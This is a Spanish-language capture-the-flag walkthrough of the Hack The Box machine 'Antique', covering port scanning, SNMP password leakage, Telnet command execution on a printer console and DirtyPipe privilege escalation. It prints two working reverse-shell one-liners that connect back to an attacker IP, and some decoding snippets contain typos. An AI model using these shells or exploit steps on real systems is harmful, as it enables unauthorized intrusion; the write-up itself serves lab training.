## Antique

---

![imagenimagen](/images/20250523112657.png)

###### Técnicas demostradas:

- SNMP Enumeration
- Network Printer Abuse
- CUPS Administration Exploitation (ErrorLog)
- EXTRA -> (DirtyPipe) (CVE-2022-0847)

---

Realizamos el escaneo de puertos por TCP con `nmap`

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
```

![imagenimagen](/images/20250429111124.png)

Realizamos un escaneo exhaustivo del puertos encontrado.

```bash
nmap -p23 -sCV 10.10.11.107 -oN targeted
```

![imagenimagen](/images/20250429111530.png)

Haremos un escaneo de los puertos `UDP` de la máquina.

```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107
```

Lo analizamos de forma exhaustiva

```bash
nmap -p161 -sU -sV -sC 10.10.11.107
```

![imagenimagen](/images/20250429120521.png)

Ya que el `SNMP` es público vamos a usar la herramienta `snmpwalk` para obtener información

```bash
snmpwalk -v 2c -c public 10.10.11.107
```

![imagenimagen](/images/20250429120647.png)

Lanzaremos una consulta `MIB` --> [Emisión de una consulta MIB de SNMP - Documentación de IBM](https://www.ibm.com/docs/es/networkmanager/4.2.0?topic=information-issuing-snmp-mib-query)

```bash
snmpwalk -v 2c -c public 10.10.11.107 1
```

![imagenimagen](/images/20250429121023.png)

Mediante Python vamos a decodificar esta cadena

```python
import binascii

s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 11 9 122 123 126 130 131 134 134'

binascci.unhexlify(s.replace(' ',''))
```

![imagenimagen](/images/20250429121737.png)

Otra manera de hacerlo mediante `bash`

```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 11 9 122 123 126 130 131 134 134" | xargs | xxd -ps r
```

Ahora que tenemos la contraseña vamos a conectarnos a la máquina por `Telnet`

```bash
telnet 10.10.11.107 23
```

![imagenimagen](/images/20250429121842.png)

Si usamos la `?` para que nos muestre las opciones

```bash
?
```

Llama la atención que permite la ejecución de comando mediante `exec` pero antes vamos a probar otra cosa.

![imagenimagen](/images/20250429121904.png)

Probamos a cambiar el nombre del host

```bash
host-name: test.htb
```

![imagenimagen](/images/20250429122148.png)

Tras no poder actualizarlo vamos a ejectar otro comando

```bash
exec id
```

Como vemos el usuario es `lp` que pertenece al grupo `lpadmin`

![imagenimagen](/images/20250429122325.png)

Sabiendo esto vamos a preparar un payload con Python para entablarnos una reverse shell, podremos a la escucha a nuestra máquina por el puerto 1234

```bash
nc -nlvp 1234
```

Y en la máquina a través de Telnet:

```bash
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

o

```bash
exec bash -c "bash -i >& /dev/tcp/10.10.14.9/1234 0>&1"
```

![imagenimagen](/images/20250429123054.png)

En el directorio personal del usuario `lp` tenemos la primera flag

![imagenimagen](/images/20250429123213.png)

#### Escalada de privilegios:

Vamos a emplear la vulnerabilidad CVE-2022-0847 que afecta al kernel de versión antigua. Para ello usaremos: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

Una vez tenemos el exploit.c en la máquina lo complilamos:

```bash
gcc priv.c -o priv
```

Por último lo ejecutamos:

```bash
./priv
```

![imagenimagen](/images/20250430102908.png)

Tenemos la flag de root:

![imagenimagen](/images/20250430102948.png)
